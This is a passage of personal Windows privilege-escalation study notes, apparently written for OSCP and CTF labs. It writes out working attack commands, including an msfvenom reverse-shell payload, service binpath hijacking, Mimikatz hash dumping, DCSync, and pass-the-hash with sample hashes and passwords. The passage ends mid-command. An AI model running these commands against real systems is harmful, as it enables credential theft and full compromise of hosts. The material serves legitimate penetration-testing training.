href="Recon_+_Services--SMB_11.html#Windows Fingerprinting">Windows Fingerprinting</a>). May not be totally reliable, but it&#39;s a quick method to check vuln.</p><p></p><p><h3>Determine OS Version &amp; Build</h3></p><p><em>systeminfo</em></p><p></p><p><span style="text-decoration:underline;">Output</span>- <strong>OS Version: 10.0.18362 N/A Build 18362</strong></p><p></p><p>Look up <a href="https://en.wikipedia.org/wiki/Windows_10_version_history">Windows 10 version history</a> &amp; <strong>CTRL + F</strong> 18362. This shows the date is 2019-2020, which should be vuln to GodPotato.</p><p></p><p><h3>Hotfixes</h3></p><p>Even if OS appears to be vuln ver, there could be a hotfix (aka KB / Knowledge Base) installed that prevent specific exploits.</p><p></p><p><em>systeminfo</em> can list installed Hotfixes (often have prefix KB), but it&#39;s not as reliable as below command! It may miss things!</p><p></p><p><span class="subheading">Preferred Method</span>: This outputs Date <strong>InstalledOn</strong>, a link to the Hotfix&#39;s description, etc. Depending on the date, may not need to research them further (e.g for GodPotato they&#39;d need to be older than 2022 to stop the exploit).</p><p><em>wmic qfe list</em></p><p></p><p><h2>List Env Vars</h2><h1></h1></p><p><h1></h1><em>Get-ChildItem env:</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h2>Routing Info</h2><h1></h1></p><p><h1></h1>[OSCP 138]</p><p></p><p>Mainly for pivoting to another Host / Network, but there could be &gt;1 interfaces used for different things.</p><p></p><p><em>ipconfig /all</em><em></em></p><p><em></em><em></em></p><p><em>route print</em></p><p><h1></h1></p><p><h1></h1><a name="running procs"></a><h2>View Running Processes</h2><h1></h1></p><p><h1></h1><em>Get-Process</em> works similarly to <em>ps aux</em> on Linux, but it&#39;ll only show a snapshot of currently running procs. </p><p></p><p>There&#39;s a <a href="https://github.com/markwragg/PowerShell-Watch/tree/master">Github Repo</a> which can be used to dynamically list new procs (similarly to Pspy), if you provide the<strong> -Continuous</strong> arg.</p><p></p><p>The cmdlet is located in <strong>~/code/windows/powershell</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Ensure you&#39;ve the privs to run a cmd regularly before trying to use it with <em>Watch-Command</em>. Shouldn&#39;t be an issue with <em>Get-Process</em>, but may not have privs to to use it with things like <em>Get-Service</em>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: May have <a href="https://nightroman.wordpress.com/2006/09/26/watch-command-ps1-watch-commands-output-repeatedly/">issues</a> with certain cmds? “this approach may not work if a command itself operates on console output directly (e.g. uses *-Host).”</p><p></p><p><h3>Snapshot</h3><h1></h1></p><p><h1></h1><strong>{CMD} </strong><em>tasklist</em></p><p></p><p><em>Get-Process</em></p><p></p><p><em>Watch-Command {Get-Process | Format-Table Name, Id, WS, CPU, Description, Path -Auto}</em></p><p></p><p><h3>Dynamically List New Processes</h3></p><p>This will <span style="color:#ff0000;">run until it is interrupted with</span><strong><span style="color:#ff0000;"> CTRL + C</span></strong>. If you&#39;re accessing the target via a shell (&amp; unable to use control cmds like that), try to <span style="color:#ff0000;">run this in a backup shell</span>! Otherwise, you&#39;ll lose the shell!</p><p></p><p><em>Get-Process | Watch-Command -Difference -Continuous -Verbose</em></p><p></p><p><h3>Additional Process Info</h3></p><p>The WMI method may not require the same user privileges as the Get-Process method, I think?</p><p></p><p><em>Get-WmiObject Win32_Process -Filter &quot;name=&#39;NonStandardProcess.exe&#39;&quot; | Select Name, @{Name=&quot;UserName&quot;;Expression={$_.GetOwner().Domain+&quot;\&quot;+$_.GetOwner().User}} | Sort-Object UserName, Name</em></p><p></p><p><em>Get-Process -Name NonStandardProcess -FileVersionInfo -IncludeUserName</em></p><p></p><p><span class="subheading">Just Check File Path</span>: If you can&#39;t list the Owner&#39;s Username with your current privielges, you should still be able to like the Process&#39; File Path.</p><p></p><p><em>Get-Process -Name NonStandardProcess -FileVersionInfo</em></p><p></p><p><h2>Installed Software</h2></p><p>Everything may not show up from just the Registry Keys (e.g. due to an incomplete / flawed installation), so try the other methods as well.</p><p></p><p><h3>Query Registry Keys</h3></p><p>Query both of the following Registry Keys to list 32-bit &amp; 64-bit Applications.</p><p></p><p><em>Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</em></p><p></p><p><em>Get-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select displayname</em></p><p></p><p><span class="subheading">Full Results</span>:You may miss things if you append <strong>| select displayname</strong>, but the output can be overwhelming without it. Maybe only get full details for specific SW, instead of for everythin installed?</p><p></p><p><h3>Check Directories</h3></p><p>Check both the 32-bit &amp; 64-bit <strong>Program Files</strong> directories in <strong>C:\</strong></p><p></p><p>Check the contents of each user&#39;s<strong> Downloads\</strong></p><p></p><p><h3>Running Processes</h3></p><p>Check the software that&#39;s currently running as a <a href="PrivEsc--Windows_9.html#running procs">process</a>. You can cross-reference PIDs from things like <strong>netstat -ano</strong>.</p><p><h1></h1></p><p><h1>Abuse Scheduled Tasks</h1><h1></h1></p><p><h1></h1>[OSCP 149-150]</p><p><h2>View Scheduled Tasks</h2></p><p><h3>My Method</h3></p><p><em>$schtask = schtasks.exe /query /V /FO CSV | ConvertFrom-Csv | Where { $_.TaskName -ne &quot;TaskName&quot; }</em><em></em></p><p><em>$schtask | where {$_.&quot;Next Run Time&quot; -notlike &quot;N/A&quot;}</em></p><p></p><p><span class="subheading">Filter Out Current User</span>: $schtask | where {$_.&quot;Next Run Time&quot; -notlike &quot;N/A&quot; -And $_.&quot;Run As User&quot; -notlike &quot;celia.almeda&quot;}</p><p></p><p><h3>Offsec Method</h3></p><p>Open the Flood Gates</p><p></p><p><em>schtasks /query /fo LIST /v</em></p><p></p><p><span class="subheading">Try with some filters</span></p><p><em>schtasks /query /fo LIST | findstr &quot;TaskName Next Run Time&quot;</em></p><p></p><p>OR</p><p></p><p><em>schtasks /query /fo LIST | findstr /ri &quot;TaskName$Next Run Time&quot;</em></p><p><h1></h1></p><p><h1>Service Binary Hijacking &amp; Unquoted Service Path</h1><h1></h1></p><p><h1></h1>[OSCP 143-149 &amp; CTF B 81]</p><p></p><p>Very similar concepts. SVC Binary Hijacking involves modifying / replacing the binary that&#39;s executed by a SVC.</p><p></p><p>Unquoted SVC Path Atk involves hijacking the search order when the SVC path contains spaces &amp; is not in quotes by writing a binary to a location that&#39;ll be checked before the legit binary is found.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Just bc a <span style="color:#ff0000;">SVC file is in a user&#39;s dir</span>, doesn&#39;t mean they&#39;re the owner / <span style="color:#ff0000;">may not be executed in the context of their Acct</span>. It <span style="color:#ff0000;">could still be a PrivEsc vector</span>!</p><p></p><p><h2>Enum Services</h2><h2></h2></p><p><h2></h2>Typically, def SVCs are in <strong>C:\Windows</strong> &amp; non-def are in other locations, but MAY NOT always be the case. It&#39;s <span style="color:#ff0000;">possible for non-def SVC</span> <span style="color:#ff0000;">to be in</span><strong><span style="color:#ff0000;"> C:\Windows</span></strong>, &amp; these queries would filter those out.</p><p></p><p>May need to remove some of the filters (i.e in the PS cmd), but they&#39;re at least a good place to start.</p><p></p><p><span style="color:#ff0000;">CMD method</span> may be <span style="color:#ff0000;">prefferable</span>. Execute in PS with- <em>cmd /c ‘CODE’</em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><strong>{CMD}</strong> <em>wmic service get name,displayname,pathname,startmode | findstr /v /i &quot;C:\Windows&quot;</em>			(Optionally add <strong>,state</strong> but output will be cluttered on screen &amp; harder to read!)<h2></h2></p><p><h2></h2></p><p><strong>{PS}</strong> <em>Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode,State | Where-Object {$_.PathName -notlike &quot;C:\Windows*&quot;} | FL</em></p><p><strong>{PS}</strong> <em>Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode,State | Where-Object {$_.State -like &#39;Running&#39; -And $_.StartMode -like &#39;Auto&#39; -And $_.PathName -notlike &quot;C:\Windows*&quot;}</em></p><p></p><p><h3>File Path Doesn&#39;t Exist</h3></p><p>[CTF2 109]</p><p>If a SVC is set to use an executable from a non-existent file path, you have 2 options:</p><p><ol><li>Create the parent directories (if you have Perms to do so) with <strong>mkdir</strong></li></ol></p><p><ol><li>Abuse an “Unquoted Service Path” to place the payload in an existing directory that&#39;ll come 1st in the search order</li></ol></p><p></p><p><h2>Additional Info</h2></p><p>Even if you don&#39;t have permissions to enumerate service info using other methods, may be able to identify the process launched by a service (e.g. <strong>Get-Process</strong>), &amp; use that name with <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc742055(v=ws.11)">sc qc</a></p><p></p><p><em>sc qc spoofer-scheduler</em></p><p><h2></h2></p><p><h2>Check Permissons</h2></p><p>Check the specific file &amp; parent dirs with icacls, but <span style="color:#ff0000;">leave off trailing \ for dirs</span>.</p><p></p><p><em>icacls &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\SQLAGENT.EXE&quot;</em><em></em></p><p><em>icacls &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn&quot;</em></p><p></p><p><h3>Permissions</h3></p><p>[OSCP 12-13, 144]</p><p></p><p>Above resources aren&#39;t complete list, &amp; don&#39;t incl all abusable permissions! See <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks">Microsoft&#39;s icacls</a> page.</p><p>Don&#39;t forget to <span style="color:#ff0000;">check your group membership</span>!</p><p></p><p><h3>Check Owner</h3></p><p><span class="subheading">Check Everything</span>: To check files &amp; dirs, can use either of the following-</p><p><em>cmd /c &#39;dir /q &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn&quot;&#39;</em><em></em></p><p><em>Get-ChildItem &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn&quot; | Select-Object fullname, LastAccessTime, LastWriteTime, CreationTime, @{N=&#39;Owner&#39;;E={$_.GetAccessControl().Owner}}</em></p><p></p><p><span class="subheading">Check Directories Only</span>: <em>cmd /c &#39;dir /q /ad &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\&quot;&#39;</em></p><p></p><p><h2>Check Service State</h2></p><p><span style="color:#ff0000;">Sometimes only CMD will work &amp; not PS </span>(&amp; vice versa?). If 1 fails, try the other!</p><p></p><p>See if the service is running or not. Use the “<span style="color:#ff0000;">Displayname</span>” for these queries, not the path / file name.</p><p></p><p><strong>{PS}</strong> <em>Get-Service -Displayname &quot;DevService&quot;</em></p><p></p><p><strong>{CMD}</strong> sc query &quot;VeyonService&quot;</p><p></p><p><h3>Changing State</h3></p><p>Try to stop SVC, if you can&#39;t try to restart it, &amp; if all else failes may be able to restart computer itself (or crash it?). <strong><span style="color:#e01b24;">{Warning}</span></strong> may not be allowed to restart computer IRL.</p><p></p><p><span class="subheading">Stop SVC</span>: <span style="color:#ff0000;">If unable to stop the service</span>, <span style="color:#ff0000;">may get an error</span> like <strong>Access is Denied</strong> <span style="color:#ff0000;">or may not get any output</span>.</p><p></p><p><em>net stop DevService</em></p><p></p><p><span class="subheading">Reboot Computer</span>: If you don&#39;t have the privs to stop the SVC, run <em>whoami /priv</em> &amp; look for <strong>SeShutdownPrivilege</strong>. Then trigger immediate reboot (not shutdown!) with the following command (may need to run &gt;1 time!).</p><p></p><p><em>shutdown /r /t 0</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Be sure your <span style="color:#ff0000;">listener is already running</span>! Rebooting will kill your prev access to machine, &amp; it may trigger this payload quickly. Don&#39;t miss the shell!</p><p></p><p><h2>Payload</h2></p><p>Ideally spawn R shell, using <em>msfvenom</em> or a compiled C program. Depending on who runs the SVC you&#39;re attacking, may be limited by their privs (e.g may not be able to use a payload that create a new local admin acct)</p><p></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=135 -f exe -o shell-135.exe</em></p><p></p><p><h3>Unquoted Service Path Placement</h3></p><p>If SVC Path is <strong>C:\folder\Development stuff 01\binary.exe</strong>, &amp; you&#39;ve neccesary privs for <strong>C:\folder</strong>, move payload to  <strong>C:\folder\Development.exe</strong></p><p></p><p><h3>Service Binary Hijacking</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span><span style="color:#ff0000;">If you can&#39;t remove the file</span> (i.e Permission Denied), <span style="color:#ff0000;">may still be able to </span><a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#removing files">MOVE the file</a>!</p><p></p><p><h2>Insecure Service Permissions</h2></p><p>[<a href="https://tryhackme.com/room/windows10privesc">TryHackMe</a>]</p><p></p><p>Another attack vector is changing the config for an existing SVC so it&#39;ll execute a payload.</p><p></p><p><h3>ID Vulnerable Services</h3></p><p><strong>accesschk.exe</strong> is a part of the <span style="color:#ff0000;">Sysinternals</span> tool suite, &amp; it&#39;s used to check the effective ACLs for files, directories, processes, &amp; other objects. It lists users or groups who have permissions to access certain system resources.</p><p></p><p>For example, the following command checks the permissions for &quot;bob&quot; on the &quot;daclsvc&quot; service.</p><p></p><p><em>C:\PrivEsc\accesschk.exe /accepteula -uwcqv bob daclsvc</em></p><p></p><p><span class="subheading">Arguments</span></p><p><strong>-u</strong> Tells the tool to check access permissions for user accounts specifically.</p><p></p><p><strong>-w </strong>Indicates the tool should display the access rights for objects that the user can write to. It focuses on write permissions.</p><p></p><p><strong>-c </strong>Tells accesschk.exe to report on the &quot;child&quot; or nested objects (e.g. files within a directory or processes under a service).</p><p></p><p><h3>Get Service Info</h3></p><p>In this case, &quot;bob&quot; has the permission to change the service config (<strong>SERVICE_CHANGE_CONFIG</strong>).</p><p></p><p>Querying the service for more info. For example, runs with SYSTEM privileges (<strong>SERVICE_START_NAME</strong>) in this case.</p><p></p><p><em>sc qc daclsvc</em></p><p></p><p><h3>Modify Service Config</h3></p><p>Modify the service config and set the <strong>BINARY_PATH_NAME</strong> (binpath) to the <strong>reverse.exe</strong> executable you created with <strong>msfvenom</strong>.</p><p></p><p><em>sc config daclsvc binpath= &quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;</em></p><p></p><p><h3>Trigger Payload</h3></p><p>Start a listener on your machine &amp; start the service to spawn a reverse shell running with SYSTEM privileges.</p><p></p><p><em>net start daclsvc</em></p><p></p><p><h1>Service DLL Hijacking</h1></p><p>[OSCP 146-148]</p><p></p><p><h2>Identify DLLs Loaded by Service</h2></p><p>The easiest method is to use Windows <strong>Process Monitor</strong>. It requires Admin Privs to run, but you can copy the SVC Binary to your machine &amp; run ProcMon there.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Are there Alt methods, like <a href="https://superuser.com/questions/381276/what-are-some-nice-command-line-ways-to-inspect-dll-exe-details">tools</a> that can be run on Linux or won&#39;t require Admin Privs? Or can you <span style="color:#ff0000;">RevEng the binary</span> with a tool like Ghidra (dogbolt.org)?</p><p></p><p><a name="Mimikatz"></a><h1>Mimikatz</h1><h1></h1></p><p><h1></h1>Basic Usage [OSCP 126-127 &amp; Win 78-82]. See <a href="PrivEsc--Windows--Active_Directory_10.html#Mimikatz in AD">AD Usage</a> &amp; <a href="https://tools.thehacker.recipes/mimikatz/modules">Module Cheatsheet</a>.</p><p></p><p><span style="color:#060f94;">Tip</span>: May have better luck with <strong><span style="color:#ff0000;">lsassy</span></strong>, since it uses <span style="color:#ff0000;">many methods to dump hashes</span>. <span style="color:#ff0000;">Works remotely</span> from Attacker Machine!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">OPSEC</span>: The <strong>event</strong> module can help cover your tracks, or even prevent you from generating some tracks in the first place!</p><p></p><p><h2>Requirements</h2></p><p>Diff requirements for diff usecases. For ex,  DCSync Atks require specialized privs (e.g related to creating backups) &amp; forging tickets may not require any special privs.</p><p></p><p><h3>Classic Hash Dumping</h3></p><p>I believe that there are the same requirements for interacting with LSASS &amp; SAM (SAM is the DB where local hashes are stroed. LSASS is the proc that uses these hashes for Auth, &amp; also stores cached Domain Creds in RAM).</p><p></p><p>Must meet one of the following conditions. (Do you need Admin regardless in addition to either SeDebugPrivilege or SeImpersonatePrivilege? Or is SeImpersonatePrivilege enough on its own?)</p><p></p><p><span class="subheading">Administrator (or Higher)</span>: As a Local Administrator you&#39;ll need to <span style="color:#ff0000;">launch PS as Admin</span> &amp; use Mimikatz to enable SeDebugPrivilege (which you have by def, but it&#39;s disabled). <strong>privilege::debug</strong></p><p></p><p><span class="subheading">SeImpersonatePrivilege</span>: (See <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege">HackTricks</a>) Various tools can use this priv to get SYSTEM privs, like Mimikatz&#39;s built-in <strong>token::elevate</strong> function.</p><p></p><p><h2>Troubleshooting</h2><h2></h2></p><p><h2></h2><h3>Network Share is Unavailable</h3></p><p><span class="subheading">Scenario</span>: You used tool like <em>xfreerdp</em> to make Mimikatz accessible on target machine, but the share isn&#39;t appearing.</p><p>Normally you can open the File Manager GUI, click <strong>Network</strong> &amp; decend down the file path to find mimikatz. </p><p>By def, the<strong> /</strong> in the Attacker&#39;s file path are replaced with<strong> _ </strong> (i.e<strong> /usr/share/windows-resources/mimikatz/x64</strong> → <strong>_usr_share_windows-resources_mimikatz_x64</strong>), &amp; is inside <strong>\\tsclient\</strong> if referenced via CLi.</p><p></p><p><span class="subheading">Solution</span>: Open the File Manager GUI, click <strong>Network</strong>. Banner at top of screen said it wasn&#39;t accessible. Click on banner to change it to accessible. Can now access the remote drive.</p><p></p><p><h3>GUI Glitch- Run PS as Admin w/o any PS Icon</h3></p><p><span class="subheading">Scenario</span>: Normally can R click PS icon and <strong>Run as Admin</strong> by searching for PS or launching it with <strong>run</strong> (Win + R) &amp; using the icon in the toolbar. However, there&#39;s no way to search Apps &amp; the toolbar isn&#39;t appearing.</p><p></p><p><span class="subheading">Solution</span>: <span style="color:#ff0000;">Launch Task Manager</span> with <strong>run</strong> &amp; <em>taskmgr</em>, or key combo (CTRL + ALT + Delete). In the top bar, click <strong>File</strong> → <strong>New Task</strong> ↓ Check the box to “Create this task with admin privileges” (etc)</p><p></p><p><h3>SAM dump Error</h3></p><p><strong>ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO</strong><strong></strong></p><p><strong>ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)</strong></p><p></p><p>Allegedly fixed in <a href="https://github.com/afernandezb92/Mimikatz-2.1.1-patch">2.1.1 fork</a> also referenced <a href="https://github.com/cobbr/Covenant/issues/25">here</a>. However, my version is 2.2.0 which is far more up to date. Can try downloading this downgraded version to see if it works?</p><p>Only happened on some hosts in the LAN. Maybe they were incompatible OS ver with current ver of Mimikatz &amp; other hosts weren&#39;t?</p><p><h1></h1></p><p><h1></h1><a name="mimikatz via shell"></a><h2>Mimikatz via Shell</h2></p><p>[CTF B 39, 45]</p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you&#39;re SYSTEM you could also <span style="color:#ff0000;">create a Local Admin &amp; use that acct to RDP</span>, letting you use the normal GUI Mimikatz from a PS terminal Running as Admin (letting you<strong> lsadump::sam /patch</strong>, for ex). </p><p><em>xfreerdp /v:192.168.196.249 /u:dave2 /p:&#39;password123!&#39; /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz/x64/</em></p><p>From Admin PS,<strong> \\tsclient\_usr_share_windows-resources_mimikatz_x64_\mimikatz.exe</strong></p><p></p><p><a href="file:///usr/share/powershell-empire/empire/server/data/module_source/credentials/">/usr/share/powershell-empire/empire/server/data/module_source/credentials/</a>		<a href="https://github.com/clymb3r/PowerShell/blob/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-Mimikatz/Invoke-Mimikatz.ps1">Invoke-Mimikatz.ps1</a></p><p></p><p><em>Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</em></p><p><em>. .\Invoke-Mimikatz.ps1</em><em></em></p><p><em>Invoke-Mimikatz -Command &quot;privilege::debug exit&quot;</em></p><p></p><p>Q: <strong>token::elevate</strong> is used to impersonate SYSTEM. Is it sometimes beneficial to not use this? For ex, if you want to use Dom Acct&#39;s privs for DCSync Attack?</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Must bypass execution policy before importing a PS module</p><p></p><p><h3>Passing an Argument</h3></p><p>To <a href="https://cheats.philkeeble.com/active-directory/mimikatz">pass an arg</a> into the Mimikatz cmd, just <span style="color:#ff0000;">wrap the double quotes in single quotes</span></p><p></p><p>Invoke-Mimikatz -Command &#39;&quot;lsadump::sam /patch exit&quot;&#39;</p><p></p><p>Interpretted as entering<strong> lsadump::sam /patch exit</strong> into Mimikatz!</p><p></p><p></p><p><h3>Using all Hash Dump Methods</h3></p><p>Current sessions- <strong>sekurlsa::logonpasswords</strong></p><p></p><p>Local Accts- <strong>lsadump::sam</strong> 		(pass args like /inject or /patch into this)</p><p></p><p>Also try-</p><p></p><p><strong>lsadump::lsa</strong> <strong>/inject</strong></p><p></p><p><strong>sekurlsa::msv</strong>				(More info <a href="https://www.matteomalvica.com/blog/2020/01/20/mimikatz-lsass-dump-windg-pykd/">here</a>. May not provide anything new?)</p><p></p><p><span class="subheading">If Domain Joined</span></p><p><strong>lsadump::dcsync</strong></p><p><em>Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /all exit&quot;&#39;</em></p><p></p><p>OR target a specific user, like Administrator for the corp.com Domain</p><p></p><p><em>lsadump::dcsync /user:corp\Administrator</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: DCSync can also be performed remotely like-<em> impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@DC_IP</em></p><p><strong></strong></p><p><strong>sekurlsa::tickets</strong></p><p><em> Invoke-Mimikatz -Command &#39;&quot;sekurlsa::tickets /export exit&quot;&#39;</em></p><p></p><p><h3>Pass the Hash</h3></p><p><span style="color:#ff0000;">SeDebugPrivilege is needed</span> for Mimikatz to inject credentials (especially NTLM hashes) into the Local Security Authority Subsystem Service (LSASS) process.</p><p></p><p>To manipulate LSASS, Mimikatz needs to open a handle to LSASS with sufficient rights to read/write its memory and inject into it.</p><p></p><p>SeDebugPrivilege allows a process to inspect and manipulate other processes, even those running under different accounts (like SYSTEM or LocalService).</p><p><h2></h2></p><p><h2></h2><span class="subheading">Inject into Current Session</span><h3></h3></p><p><h3></h3>Invoke-Mimikatz -Command ‘&quot;sekurlsa::pth /user:celia.almeda /domain:OSCP.EXAM /rc4:e728ecbadfb02f51ce8eed753f3ff3fd /impersonate&quot;’<h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><span class="subheading">Spawn New Session</span><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span>May not work if you&#39;re operating over a Reverse shell, &amp; may need to impersonate instead<span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /user:celia.almeda /domain:OSCP.EXAM /rc4:e728ecbadfb02f51ce8eed753f3ff3fd /run:powershell&quot;&#39;<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>Troubleshooting</h3></p><p><span class="subheading">Architecture Error</span></p><p>Your <span style="color:#ff0000;">shell may be running as a 32-bit (x86) Process</span>, even though target supports 64-bit Processes. If this is the case, may be able to <a href="PrivEsc--Windows--RCE_33.html#PS Arch Upgrade">upgrade</a> it.</p><p></p><p><h2>Obtaining SYSTEM Shell</h2></p><p>Even if current user is a member of the Local <span style="color:#33d17a;">Administrators</span> group, may need to compromise the built-in <span style="color:#3584e4;">Administrator</span> Acct to get SYSTEM. For ex, current user couldn&#39;t be used for <a href="PrivEsc--Windows_9.html#impacket-psexec">impacket-psexec</a> but built-in Administrator could (idk why).</p><p></p><p>Can dump built-in Administrator&#39;s Hash &amp; use that with impacket-psexec, or use Mimikatz&#39;s PTH functionality to get SYSTEM.</p><p></p><p><h3>Obtain Administrator Hash</h3></p><p>From PS running as admin, dump local hashes &amp; PtH with Administrator hash to spawn PS as NT AUTHORITY\SYSTEM.</p><p><span style="color:#ff0000;">Must incl Domain Name</span>, even though this isn&#39;t an AD machine!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Do you omit the Domain&#39;s TLD? Try with &amp; without.</p><p></p><p><strong>privilege::debug</strong><strong></strong></p><p><strong>lsadump::sam</strong><strong></strong></p><p><strong>sekurlsa::pth /user:Administrator /ntlm:dd9f8b3d513cdcd207cd34ec76d8f8c9 /domain:OSCP /run:powershell</strong></p><p></p><p><h1>Dumping Registry Hashes</h1></p><p>If you can access <a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets">certain registry hives</a>, you can <a href="Misc_Attacks--Password_Attack_5.html#Registry Hashes">extract creds</a> local creds from SAM &amp; or domain cached creds from SECURITY by using SYSTEM to decrypt them.</p><p></p><p>These hives may already exist somewhere on disk as part of a <a href="PrivEsc--Windows_9.html#Backed up Hives">prior backup</a>, allowing many users to access them.</p><p></p><p>If a backup doesn&#39;t already exist, can leverage an account with the ability to <a href="PrivEsc--Windows_9.html#SeBackupPrivilege">create backups</a> (<strong>Backup Operators</strong> &amp; <strong>SeBackupPrivilege</strong>).</p><p></p><p><a name="Saved Passwords"></a><h1>Saved Passwords</h1></p><p>There are various ways which Windows machines can store creds for diff use cases (e.g GPP-Stored Creds for AD). </p><p></p><p>See this <a href="https://juggernaut-sec.com/password-hunting/">list</a> of common implementations, &amp; how to recover the passwords from them.</p><p><h1></h1></p><p><h1></h1><h2>PSCredential File</h2></p><p><h3>Background</h3></p><p>“The PSCredential object <span style="color:#ff0000;">represents a set of security credentials such as a user name and password</span>. The object can be passed as a parameter to a function that runs as the user account in that credential object.”</p><p></p><p>For example, it&#39;s used for Lateral Movement techniques [Win 112-116].</p><p></p><p><span style="color:#8ff0a4;">As a File</span></p><p>Although it&#39;s often passed as a parameter (which you should look for in a user&#39;s command history &amp; <a href="PrivEsc--Windows_9.html#PS Histories">PS files</a>), it can also be exported &amp; <a href="https://stackoverflow.com/questions/40029235/save-pscredential-in-the-file">used as a file</a> (<span style="color:#ff0000;">typically </span><strong><span style="color:#ff0000;">XML</span></strong>).</p><p></p><p>By def, &quot;the key used to encrypt the password is specific to both the user and the machine that the code is running under. As a result, the encrypted credential cannot be imported by a different user nor the same user on a different computer.&quot;</p><p></p><p><h3>Extract Password from File</h3></p><p>This should only work if you&#39;re already logged into the machine that this file was created on as the target user. May be worth trying regardless, in case a strange mistake was made.</p><p></p><p>Output the XML file, copy the “Password” value, paste that string into a variable, &amp; decode as follows.</p><p></p><p><em>type C:\Users\bob\bob.xml</em><em></em></p><p><em></em><em></em></p><p><em>$password = &quot;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d&quot; | ConvertTo-SecureString</em><em></em></p><p><em></em><em></em></p><p><em>$cred = new-object system.management.automation.pscredential(&quot;bob&quot;, $password)</em><em></em></p><p><em></em><em></em></p><p><em>$cred.getnetworkcredential() | Select-Object *</em></p><p></p><p><span style="color:#8ff0a4;">Example Output</span></p><p></p><p><span style="text-decoration:underline;">UserName</span> 			<span style="text-decoration:underline;">Password</span>                                            <span style="text-decoration:underline;">SecurePassword</span> 										<span style="text-decoration:underline;">Domain</span></p><p>bob							BOBS_PASSWD!								System.Security.SecureString</p><p></p><p><a name="GPP-Stored Cred"></a><h2>GPP-Stored Credential</h2></p><p>[Win 69]</p><p>Often used by SysAdmins to change account passwords in an AD context. (<span style="color:#ff0000;">Check files in DC&#39;s </span><strong><span style="color:#ff0000;">SYSVOL</span></strong><span style="color:#ff0000;"> share</span>)</p><p></p><p><h3>Decrypt Locally</h3></p><p>Kali has a built-in tool that will decrypt these strings.</p><p></p><p><em>gpp-decrypt “STRING”</em></p><p></p><p><h3>PowerView</h3></p><p><a href="PrivEsc--Windows_9.html#PowerSploit">PowerView&#39;s </a><strong>Get-CachedGPPPassword</strong> automatically searches for passwords &amp; other account info that was pushed through GPP.</p><p></p><p><h2>Answer Files / Unattend Files</h2></p><p>Perform a case insensitive search for <strong>unattend.xml</strong> &amp; <strong>sysprep.xml</strong> (the most common names for Answer Files).</p><p></p><p>I believe the passwords contained in these files are either B64 encoded or clear-text. See the aforementioned <a href="https://juggernaut-sec.com/password-hunting/#Password_Hunting_%E2%80%93_Unattendxml">resource</a>.</p><p></p><p><a name="Stored Creds"></a><h2>Stored Credentials</h2></p><p>Automated tools like Winpeas &amp; Seatbelt should find stored creds, but they can sometimes miss them! <span style="color:#ff0000;">Manual enumeration</span> is always <span style="color:#ff0000;">more reliable</span>! For more info &amp; examples, see this <a href="https://juggernaut-sec.com/runas/">guide</a>.</p><p></p><p><em>cmdkey /list</em></p><p></p><p><h3>Using Stored Credentials</h3></p><p>The<strong> /savecred</strong> parameter can be used with <a href="PrivEsc--Windows--RCE_33.html#runas">runas</a> instead of a password.</p><p></p><p><em>runas /savecred /user:admin 